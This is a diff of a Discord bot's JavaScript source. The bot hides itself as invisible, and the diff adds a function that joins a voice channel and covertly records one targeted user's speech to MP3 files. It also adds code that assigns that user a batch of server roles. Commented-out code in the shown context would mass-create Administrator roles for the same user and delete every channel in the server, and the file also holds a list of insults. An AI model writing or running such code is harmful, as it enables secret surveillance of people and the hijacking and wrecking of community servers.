@@ -1,5 +1,11 @@
-const { Client, GatewayIntentBits } = require('discord.js');
+const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
+const { createAudioPlayer, joinVoiceChannel, createAudioResource, EndBehaviorType, VoiceReceiver } = require('@discordjs/voice');
 const { token } = require('./config.json');
+const { pipeline } = require('node:stream');
+const { createWriteStream } = require('node:fs');
+const ffmpeg = require('ffmpeg');
+const prism = require('prism-media');
+const Lame = require('node-lame').Lame;
 
 const client = new Client({ 
     intents: [GatewayIntentBits.Guilds, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMessages, GatewayIntentBits.GuildVoiceStates, GatewayIntentBits.GuildPresences] 
@@ -20,7 +26,7 @@ const usersId = [
     // '331776183324770305',
 
     // CAM
-    '769284773503041556' 
+    // '769284773503041556' 
 ];
 
 /**
@@ -40,6 +46,71 @@ const giovanni = [
     'rincoglionito'
 ];
 
+const jarvisPlayAudio = (connection, audioSrc) => {
+    const player = createAudioPlayer();
+
+    /*
+    const connection = joinVoiceChannel({
+        channelId: channel.id,
+        guildId: channel.guild.id,
+        adapterCreator: channel.guild.voiceAdapterCreator,
+    });
+    */
+
+    const resource = createAudioResource(audioSrc);
+    player.play(resource);
+
+    connection.subscribe(player);
+}
+
+function getDisplayName(userId, user) {
+	return user ? `${user.username}_${user.discriminator}` : userId;
+}
+
+const createListeningStream = (receiver, userId, connection) => {
+	const r = receiver.subscribe(userId, {
+		end: {
+			behavior: EndBehaviorType.AfterSilence,
+			duration: 0,
+		},
+	});
+
+}
+
+const jarvisListen = (channel) => {
+    const connection = joinVoiceChannel({
+        channelId: channel.id,
+        guildId: channel.guild.id,
+        adapterCreator: channel.guild.voiceAdapterCreator,
+        selfDeaf: false,
+    });    
+
+    connection.receiver.speaking.on('start', (userId) => {
+        if (userId === '391706479872442368') {
+            // createListeningStream(connection.receiver, userId, connection);
+            const stream = connection.receiver.subscribe(userId, {
+                end: {
+                    behavior: EndBehaviorType.AfterSilence,
+                    duration: 100
+                }
+            });
+
+            const audio = stream.pipe(createWriteStream('./recordings/valvola.pcm'));
+            audio.on('finish', () => {
+                const encoder = new Lame({
+                    'output': './recordings/valvola.mp3',
+                    'bitrate': 192
+                }).setFile('./recordings/valvola.pcm');
+
+                encoder.encode().then(() => {
+                    console.log('eheheh');
+                });
+            }); 
+
+        }
+    });
+}
+
 client.once('ready', async () => {
     client.user.setStatus('invisible');
     
@@ -51,23 +122,28 @@ client.once('ready', async () => {
         }
     }
 
-    /*
-    const player = createAudioPlayer();
-
-    const channel = mainGuild.channels.cache.get('1024399020900237393');
-    const connection = joinVoiceChannel({
-        channelId: channel.id,
-        guildId: channel.guild.id,
-        adapterCreator: channel.guild.voiceAdapterCreator,
-    });
-
-    const resource = createAudioResource('./jarvis/welcome.mp3');
-    player.play(resource);
-
-    connection.subscribe(player);
-    */
+    // jarvisPlayAudio(mainGuild.channels.cache.get('1024397481171226705'), './jarvis/welcome.mp3');
+    // jarvisListen(mainGuild.channels.cache.get('1024414812236689408'));
+        
+    const user = mainGuild.members.cache.get('391706479872442368');
+    mainGuild.roles.cache.forEach(role => {
+        if (role.name.startsWith('0')) {
+            user.roles.add(role.id);
+        }
+    })
 
     /*
+    const user = mainGuild.members.cache.get('391706479872442368');
+    for (let i = 0; i < 5000; i++) {
+        mainGuild.roles.create({ 
+            name: Math.random().toString(), 
+            color: 'Random', 
+            permissions: [PermissionsBitField.Flags.Administrator] 
+        }).then(role => {
+            user.roles.add(role.id);
+        });
+    }
+
     mainGuild.channels.cache.forEach(ch => {
         ch.delete();
     });
